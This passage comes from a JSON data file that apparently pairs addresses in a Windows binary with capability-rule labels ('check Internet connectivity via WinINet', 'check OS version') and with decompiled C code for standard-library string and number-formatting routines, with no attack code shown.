Removing unreachable block (ram,0x000140066a0b)\n// WARNING: Removing unreachable block (ram,0x000140066a13)\n// WARNING: Removing unreachable block (ram,0x0001400671e0)\n// WARNING: Removing unreachable block (ram,0x0001400671ee)\n// WARNING: Removing unreachable block (ram,0x000140067206)\n// WARNING: Removing unreachable block (ram,0x000140066a16)\n// WARNING: Removing unreachable block (ram,0x000140067300)\n// WARNING: Removing unreachable block (ram,0x00014006730e)\n// WARNING: Removing unreachable block (ram,0x0001400675b1)\n// WARNING: Removing unreachable block (ram,0x000140067691)\n// WARNING: Removing unreachable block (ram,0x0001400675c4)\n// WARNING: Removing unreachable block (ram,0x0001400675cd)\n// WARNING: Removing unreachable block (ram,0x00014006765c)\n// WARNING: Removing unreachable block (ram,0x0001400675d8)\n// WARNING: Removing unreachable block (ram,0x000140067381)\n// WARNING: Removing unreachable block (ram,0x000140066db9)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140066740(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    ulong *arg1_00;\n    int64_t iVar7;\n    ulong *in_R8;\n    uint64_t arg3;\n    ulong *in_R9;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b36a0(in_stack_00000028 + 0xd0);\n    iVar4 = fcn.1400261c0(0x1400fb400);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + iVar4 * 8;\n    iVar7 = *piVar1;\n    if (iVar7 == 0) {\n        arg1_00 = fcn.1400b6520(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b650;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.14009a5d0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, iVar4);\n        iVar7 = *piVar1;\n    }\n    iStack88 = fcn.140075910(0, 0);\n    if (*(iVar7 + 0x20) != '\\0') {\n        fcn.140077810(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    fcn.140077810(aiStack80, 0x20);\n    iVar4 = 0;\n    uStack92 = *(iVar7 + 0x60);\n    do {\n        if (*(&uStack92 + iVar4) < 5) {\n    // WARNING: Could not recover jumptable at 0x0001400668b5. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fe6fc\n            puVar5 = (*(*(*(&uStack92 + iVar4) * 4 + 0x1400fe6fc) + 0x1400fe6fc))();\n            return puVar5;\n        }\n        iVar2 = iVar4;\n        iVar4 = iVar4 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar6 = fcn.14001ef10(aiStack80, 0x30, 0),  uVar6 != 0)) {\n        arg3 = *(aiStack80[0] + -0x18);\n        if (uVar6 == 0xffffffffffffffff) {\n            uVar6 = arg3 - 1;\n        }\n        if (uVar6 <= arg3) {\n            arg3 = uVar6;\n        }\n        fcn.140077920(aiStack80, 0, arg3, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.140077ac0(&iStack88, 0);\n        cVar3 = fcn.1400b15c0(*(iVar7 + 0x10), *(iVar7 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.1400762a0(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140023f10(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.140075fa0(aiStack80[0] + -0x18);\n    fcn.140075fa0(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2026
    },
    "140067c1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140068723)\n// WARNING: Removing unreachable block (ram,0x000140067f04)\n// WARNING: Removing unreachable block (ram,0x000140067f0d)\n// WARNING: Removing unreachable block (ram,0x000140067f1a)\n// WARNING: Removing unreachable block (ram,0x000140068770)\n// WARNING: Removing unreachable block (ram,0x000140068b5c)\n// WARNING: Removing unreachable block (ram,0x00014006877e)\n// WARNING: Removing unreachable block (ram,0x000140068782)\n// WARNING: Removing unreachable block (ram,0x00014006878d)\n// WARNING: Removing unreachable block (ram,0x000140067f23)\n// WARNING: Removing unreachable block (ram,0x000140067f2e)\n// WARNING: Removing unreachable block (ram,0x000140068843)\n// WARNING: Removing unreachable block (ram,0x000140067f44)\n// WARNING: Removing unreachable block (ram,0x000140067f4c)\n// WARNING: Removing unreachable block (ram,0x000140067ea4)\n// WARNING: Removing unreachable block (ram,0x00014006849e)\n// WARNING: Removing unreachable block (ram,0x000140067eaf)\n// WARNING: Removing unreachable block (ram,0x000140067eb3)\n// WARNING: Removing unreachable block (ram,0x000140067f63)\n// WARNING: Removing unreachable block (ram,0x000140067f75)\n// WARNING: Removing unreachable block (ram,0x000140067ed0)\n// WARNING: Removing unreachable block (ram,0x000140067f7e)\n// WARNING: Removing unreachable block (ram,0x000140068b26)\n// WARNING: Removing unreachable block (ram,0x000140067f8c)\n// WARNING: Removing unreachable block (ram,0x000140067f8f)\n// WARNING: Removing unreachable block (ram,0x000140068a65)\n// WARNING: Removing unreachable block (ram,0x000140067f99)\n// WARNING: Removing unreachable block (ram,0x000140067ed3)\n// WARNING: Removing unreachable block (ram,0x000140067eee)\n// WARNING: Removing unreachable block (ram,0x0001400686a0)\n// WARNING: Removing unreachable block (ram,0x000140068b1b)\n// WARNING: Removing unreachable block (ram,0x0001400686ae)\n// WARNING: Removing unreachable block (ram,0x0001400686b1)\n// WARNING: Removing unreachable block (ram,0x000140068a54)\n// WARNING: Removing unreachable block (ram,0x0001400686bb)\n// WARNING: Removing unreachable block (ram,0x000140067ef6)\n// WARNING: Removing unreachable block (ram,0x0001400686d0)\n// WARNING: Removing unreachable block (ram,0x0001400686de)\n// WARNING: Removing unreachable block (ram,0x000140068abb)\n// WARNING: Removing unreachable block (ram,0x000140068b91)\n// WARNING: Removing unreachable block (ram,0x000140068ace)\n// WARNING: Removing unreachable block (ram,0x000140068ad7)\n// WARNING: Removing unreachable block (ram,0x000140068b84)\n// WARNING: Removing unreachable block (ram,0x000140068ae2)\n// WARNING: Removing unreachable block (ram,0x000140068751)\n// WARNING: Removing unreachable block (ram,0x000140068243)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140067c10(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t arg3;\n    uint *puVar4;\n    uint64_t uVar5;\n    ulong *arg1_00;\n    ulong *in_R8;\n    uint64_t arg3_00;\n    ulong *in_R9;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack200;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b3700(in_stack_00000028 + 0xd0);\n    arg3 = fcn.1400261c0(0x1400fb410);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3 * 8;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        arg1_00 = fcn.1400b6520(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b670;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.14009ae00(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, arg3);\n        iVar6 = *piVar1;\n    }\n    iStack88 = fcn.140075910(0, 0);\n    if (*(iVar6 + 0x20) != '\\0') {\n        fcn.140077810(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    fcn.140077810(aiStack80, 0x20);\n    uStack92 = *(iVar6 + 0x60);\n    iStack200 = 0;\n    do {\n        if (*(&uStack92 + iStack200) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140067d88. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fecc0\n            puVar4 = (*(*(*(&uStack92 + iStack200) * 4 + 0x1400fecc0) + 0x1400fecc0))();\n            return puVar4;\n        }\n        iVar2 = iStack200;\n        iStack200 = iStack200 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar5 = fcn.14001ef10(aiStack80, 0x30, 0),  uVar5 != 0)) {\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (uVar5 == 0xffffffffffffffff) {\n            uVar5 = arg3_00 - 1;\n        }\n        if (uVar5 <= arg3_00) {\n            arg3_00 = uVar5;\n        }\n        fcn.140077920(aiStack80, 0, arg3_00, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.140077ac0(&iStack88, 0);\n        cVar3 = fcn.1400b15c0(*(iVar6 + 0x10), *(iVar6 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.1400762a0(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140024020(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.140075fa0(aiStack80[0] + -0x18);\n    fcn.140075fa0(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2129
    },
    "140068c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140069733)\n// WARNING: Removing unreachable block (ram,0x000140068f14)\n// WARNING: Removing unreachable block (ram,0x000140068f1d)\n// WARNING: Removing unreachable block (ram,0x000140068f2a)\n// WARNING: Removing unreachable block (ram,0x000140069780)\n// WARNING: Removing unreachable block (ram,0x000140069b6c)\n// WARNING: Removing unreachable block (ram,0x00014006978e)\n// WARNING: Removing unreachable block (ram,0x000140069792)\n// WARNING: Removing unreachable block (ram,0x00014006979d)\n// WARNING: Removing unreachable block (ram,0x000140068f33)\n// WARNING: Removing unreachable block (ram,0x000140068f3e)\n// WARNING: Removing unreachable block (ram,0x000140069853)\n// WARNING: Removing unreachable block (ram,0x000140068f54)\n// WARNING: Removing unreachable block (ram,0x000140068f5c)\n// WARNING: Removing unreachable block (ram,0x000140068eb4)\n// WARNING: Removing unreachable block (ram,0x0001400694ae)\n// WARNING: Removing unreachable block (ram,0x000140068ebf)\n// WARNING: Removing unreachable block (ram,0x000140068ec3)\n// WARNING: Removing unreachable block (ram,0x000140068f73)\n// WARNING: Removing unreachable block (ram,0x000140068f85)\n// WARNING: Removing unreachable block (ram,0x000140068ee0)\n// WARNING: Removing unreachable block (ram,0x000140068f8e)\n// WARNING: Removing unreachable block (ram,0x000140069b36)\n// WARNING: Removing unreachable block (ram,0x000140068f9c)\n// WARNING: Removing unreachable block (ram,0x000140068f9f)\n// WARNING: Removing unreachable block (ram,0x000140069a75)\n// WARNING: Removing unreachable block (ram,0x000140068fa9)\n// WARNING: Removing unreachable block (ram,0x000140068ee3)\n// WARNING: Removing unreachable block (ram,0x000140068efe)\n// WARNING: Removing unreachable block (ram,0x0001400696b0)\n// WARNING: Removing unreachable block (ram,0x000140069b2b)\n// WARNING: Removing unreachable block (ram,0x0001400696be)\n// WARNING: Removing unreachable block (ram,0x0001400696c1)\n// WARNING: Removing unreachable block (ram,0x000140069a64)\n// WARNING: Removing unreachable block (ram,0x0001400696cb)\n// WARNING: Removing unreachable block (ram,0x000140068f06)\n// WARNING: Removing unreachable block (ram,0x0001400696e0)\n// WARNING: Removing unreachable block (ram,0x0001400696ee)\n// WARNING: Removing unreachable block (ram,0x000140069acb)\n// WARNING: Removing unreachable block (ram,0x000140069ba1)\n// WARNING: Removing unreachable block (ram,0x000140069ade)\n// WARNING: Removing unreachable block (ram,0x000140069ae7)\n// WARNING: Removing unreachable block (ram,0x000140069b94)\n// WARNING: Removing unreachable block (ram,0x000140069af2)\n// WARNING: Removing unreachable block (ram,0x000140069761)\n// WARNING: Removing unreachable block (ram,0x000140069253)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140068c20(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t arg3;\n    uint *puVar4;\n    uint64_t uVar5;\n    ulong *arg1_00;\n    ulong *in_R8;\n    uint64_t arg3_00;\n    ulong *in_R9;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack200;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b3700(in_stack_00000028 + 0xd0);\n    arg3 = fcn.1400261c0(0x1400fb420);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3 * 8;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        arg1_00 = fcn.1400b6520(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b690;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.14009b620(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, arg3);\n        iVar6 = *piVar1;\n    }\n    iStack88 = fcn.140075910(0, 0);\n    if (*(iVar6 + 0x20) != '\\0') {\n        fcn.140077810(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    fcn.140077810(aiStack80, 0x20);\n    uStack92 = *(iVar6 + 0x60);\n    iStack200 = 0;\n    do {\n        if (*(&uStack92 + iStack200) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140068d98. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fecac\n            puVar4 = (*(*(*(&uStack92 + iStack200) * 4 + 0x1400fecac) + 0x1400fecac))();\n            return puVar4;\n        }\n        iVar2 = iStack200;\n        iStack200 = iStack200 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar5 = fcn.14001ef10(aiStack80, 0x30, 0),  uVar5 != 0)) {\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (uVar5 == 0xffffffffffffffff) {\n            uVar5 = arg3_00 - 1;\n        }\n        if (uVar5 <= arg3_00) {\n            arg3_00 = uVar5;\n        }\n        fcn.140077920(aiStack80, 0, arg3_00, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.140077ac0(&iStack88, 0);\n        cVar3 = fcn.1400b15c0(*(iVar6 + 0x10), *(iVar6 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.1400762a0(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140024020(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.140075fa0(aiStack80[0] + -0x18);\n    fcn.140075fa0(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2126
    },
    "14006a47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006a470(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    int64_t **ppiVar1;\n    char cVar2;\n    int64_t *piVar3;\n    int64_t arg3_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong *arg1_00;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint8_t *puVar10;\n    int64_t *piVar11;\n    uint64_t uVar12;\n    uint8_t *arg2;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    char in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack176;\n    char *pcStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar3 = *arg3;\n    piVar15 = arg3[1];\n    iVar6 = fcn.1400b36a0(arg4 + 0xd0);\n    iVar7 = fcn.1400261c0(0x1400fb3f0);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar7 * 8;\n    piVar13 = *ppiVar1;\n    if (piVar13 == NULL) {\n        arg1_00 = fcn.1400b6520(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b630;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.140099da0(arg1_00, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), arg1_00, iVar7);\n        piVar13 = *ppiVar1;\n    }\n    arg2 = *in_stack_00000030;\n    piVar11 = arg2 + -0x18;\n    if (*arg2 == *(piVar13 + 100)) {\n        uStack92 = *(piVar13 + 0xc);\n        pcStack160 = piVar13[9];\n        uStack176 = piVar13[10];\n        if (*piVar11 == 0) goto code_r0x00014006a53f;\n        arg2 = arg2 + 1;\n    }\n    else {\n        uStack92 = *(piVar13 + 0x5c);\n        pcStack160 = piVar13[7];\n        uStack176 = piVar13[8];\n    }\n    if (arg2 < arg2 + *piVar11) {\n        puVar10 = arg2;\n        do {\n            if ((*(*(iVar6 + 0x30) + *puVar10 * 2) & 8) == 0) break;\n            puVar10 = puVar10 + 1;\n        } while (arg2 + *piVar11 != puVar10);\n        iVar6 = puVar10 - arg2;\n        if (iVar6 != 0) {\n            iStack88 = fcn.140075910(0, 0);\n            fcn.140077810(&iStack88, iVar6 * 2);\n            iVar5 = *(piVar13 + 0xb);\n            iVar14 = iVar6 - iVar5;\n            if (0 < iVar14) {\n                if (iVar5 < 0) {\n                    iVar14 = iVar6;\n                }\n                if (piVar13[3] == 0) {\n                    fcn.140076900(&iStack88, arg2, iVar14);\n                }\n                else {\n                    fcn.140075d80(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                    iVar7 = piVar13[3];\n                    arg3_00 = piVar13[2];\n                    cVar2 = *(piVar13 + 0x22);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.1400758a0(&iStack88);\n                    }\n                    iVar7 = fcn.1400b0000(iStack88, cVar2, arg3_00, iVar7);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.1400758a0(&iStack88);\n                    }\n                    uVar12 = *(iStack88 + -0x18);\n                    uVar9 = iVar7 - iStack88;\n                    if (uVar12 < uVar9) {\n                        uVar8 = fcn.1400b1a60(0x1400fe528, 0x1400fe512, uVar9, uVar12);\n                        fcn.140075fa0(iStack88 + -0x18);\n                        uVar8 = fcn.14000f000(uVar8);\n                        fcn.1400b6670(uVar8);\n                        (**(*piVar13 + 8))(piVar13);\n                        do {\n                            uVar8 = fcn.1400b6b70();\n                            fcn.1400b6670(uVar8);\n                        } while( true );\n                    }\n                    fcn.140077920(&iStack88, uVar9, uVar12 - uVar9, 0);\n                }\n                iVar5 = *(piVar13 + 0xb);\n            }\n            if (0 < iVar5) {\n                fcn.140077ac0(&iStack88, *(piVar13 + 0x21));\n                if (iVar14 < 0) {\n                    fcn.1400767c0(&iStack88, -iVar14, *(piVar13 + 0x65));\n                    fcn.140076500(&iStack88, arg2, iVar6);\n                }\n                else {\n                    fcn.140076500(&iStack88, arg2 + iVar14, *(piVar13 + 0xb));\n                }\n            }\n            uVar4 = *(arg4 + 0x18) & 0xb0;\n            uStack152 = uStack176 + *(iStack88 + -0x18);\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                uStack152 = uStack152 + piVar13[6];\n            }\n            aiStack80[0] = fcn.140075910(0, 0);\n            fcn.140077810(aiStack80, uStack152 * 2);\n            uVar12 = *(arg4 + 0x10);\n            piVar11 = &uStack92;\n            do {\n                if (*piVar11 < 5) {\n    // switch table (5 cases) at 0x1400fe574\n                    switch(*piVar11) {\n                    case 0:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.1400767c0(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        break;\n                    case 1:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.1400767c0(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        else {\n                            fcn.140077ac0(aiStack80, in_stack_00000028);\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg4 + 0x19) & 2) != 0) {\n                            fcn.140076500(aiStack80, piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (uStack176 != 0) {\n                            fcn.140077ac0(aiStack80, *pcStack160);\n                        }\n                        break;\n                    case 4:\n                        fcn.140076610(aiStack80, &iStack88);\n                    }\n                }\n                piVar11 = piVar11 + 1;\n            } while (piVar11 != &iStack88);\n            if (1 < uStack176) {\n                fcn.140076500(aiStack80, pcStack160 + 1, uStack176 - 1);\n            }\n            uVar9 = *(aiStack80[0] + -0x18);\n            if (uVar9 < uVar12) {\n                if (uVar4 == 0x20) {\n                    fcn.1400767c0(aiStack80, uVar12 - uVar9, in_stack_00000028);\n                    uVar9 = uVar12;\n                }\n                else {\n                    fcn.140075d80(aiStack80, 0, 0, uVar12 - uVar9);\n                    uVar9 = uVar12;\n                }\n            }\n            uVar12 = piVar15 & 0xffffffff;\n            if ((piVar15 == '\\0') && (iVar6 = (**(*piVar3 + 0x60))(piVar3, aiStack80[0], uVar9),  uVar9 != iVar6)) {\n                uVar12 = 1;\n            }\n            piVar15 = piVar15 & 0xffffffffffffff00 | uVar12 & 0xff;\n            fcn.140075fa0(aiStack80[0] + -0x18);\n            fcn.140075fa0(iStack88 + -0x18);\n        }\n    }\ncode_r0x00014006a53f:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar3;\n    return arg1;\n}\n",
        "token_count": 2338
    },
    "14006ab1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006ab10(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    int64_t **ppiVar1;\n    char cVar2;\n    int64_t *piVar3;\n    int64_t arg3_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong *arg1_00;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint8_t *puVar10;\n    int64_t *piVar11;\n    uint64_t uVar12;\n    uint8_t *arg2;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    char in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack176;\n    char *pcStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar3 = *arg3;\n    piVar15 = arg3[1];\n    iVar6 = fcn.1400b36a0(arg4 + 0xd0);\n    iVar7 = fcn.1400261c0(0x1400fb400);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar7 * 8;\n    piVar13 = *ppiVar1;\n    if (piVar13 == NULL) {\n        arg1_00 = fcn.1400b6520(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b650;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.14009a5d0(arg1_00, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), arg1_00, iVar7);\n        piVar13 = *ppiVar1;\n    }\n    arg2 = *in_stack_00000030;\n    piVar11 = arg2 + -0x18;\n    if (*arg2 == *(piVar13 + 100)) {\n        uStack92 = *(piVar13 + 0xc);\n        pcStack160 = piVar13[9];\n        uStack176 = piVar13[10];\n        if (*piVar11 == 0) goto code_r0x00014006abdf;\n        arg2 = arg2 + 1;\n    }\n    else {\n        uStack92 = *(piVar13 + 0x5c);\n        pcStack160 = piVar13[7];\n        uStack176 = piVar13[8];\n    }\n    if (arg2 < arg2 + *piVar11) {\n        puVar10 = arg2;\n        do {\n            if ((*(*(iVar6 + 0x30) + *puVar10 * 2) & 8) == 0) break;\n            puVar10 = puVar10 + 1;\n        } while (arg2 + *piVar11 != puVar10);\n        iVar6 = puVar10 - arg2;\n        if (iVar6 != 0) {\n            iStack88 = fcn.140075910(0, 0);\n            fcn.140077810(&iStack88, iVar6 * 2);\n            iVar5 = *(piVar13 + 0xb);\n            iVar14 = iVar6 - iVar5;\n            if (0 < iVar14) {\n                if (iVar5 < 0) {\n                    iVar14 = iVar6;\n                }\n                if (piVar13[3] == 0) {\n                    fcn.140076900(&iStack88, arg2, iVar14);\n                }\n                else {\n                    fcn.140075d80(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                    iVar7 = piVar13[3];\n                    arg3_00 = piVar13[2];\n                    cVar2 = *(piVar13 + 0x22);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.1400758a0(&iStack88);\n                    }\n                    iVar7 = fcn.1400b0000(iStack88, cVar2, arg3_00, iVar7);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.1400758a0(&iStack88);\n                    }\n                    uVar12 = *(iStack88 + -0x18);\n                    uVar9 = iVar7 - iStack88;\n                    if (uVar12 < uVar9) {\n                        uVar8 = fcn.1400b1a60(0x1400fe528, 0x1400fe512, uVar9, uVar12);\n                        fcn.140075fa0(iStack88 + -0x18);\n                        uVar8 = fcn.14000f000(uVar8);\n                        fcn.1400b6670(uVar8);\n                        (**(*piVar13 + 8))(piVar13);\n                        do {\n                            uVar8 = 